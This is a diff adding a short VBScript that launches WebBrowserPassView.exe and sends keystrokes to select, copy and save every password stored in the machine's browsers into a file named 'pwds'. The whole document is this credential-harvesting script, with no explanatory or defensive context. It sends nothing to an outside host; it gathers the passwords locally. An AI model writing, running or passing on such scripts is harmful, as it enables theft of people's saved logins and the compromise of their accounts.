@@ -1,0 +1,12 @@
+set x=createobject("wscript.shell")
+x.run "WebBrowserPassView.exe"
+wscript.sleep 4000
+x.sendkeys "^(a)"
+x.sendkeys "^(c)"
+x.sendkeys "^(v)"
+wscript.sleep 500
+x.sendkeys "^(s)"
+wscript.sleep 500
+x.sendkeys "pwds"
+x.sendkeys "{enter}"
+wscript.sleep 400
